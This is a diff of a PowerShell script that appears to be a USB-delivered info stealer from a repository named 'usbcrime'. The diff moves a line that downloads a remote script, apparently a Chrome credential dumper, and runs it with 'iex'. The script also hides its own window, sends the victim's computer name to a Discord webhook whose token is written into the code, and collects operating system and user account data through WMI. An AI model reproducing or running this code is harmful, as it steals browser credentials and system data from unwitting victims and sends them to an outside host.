@@ -12,7 +12,7 @@ else{
     $hwnd = $Proc.MainWindowHandle
     $Type::ShowWindowAsync($hwnd, 0)
 }
-Invoke-RestMethod https://raw.githubusercontent.com/bindas88/usbcrime/main/Chrome80Dp.ps1 | iex
+
 sleep 1
 $hookurl = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"
 # shortened URL Detection
@@ -22,7 +22,7 @@ $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gatheri
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 
 Add-Type -AssemblyName System.Windows.Forms
-
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/usbcrime/main/Chrome80Dp.ps1 | iex
 # WMI Classes
 $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
 $userInfo = Get-WmiObject -Class Win32_UserAccount
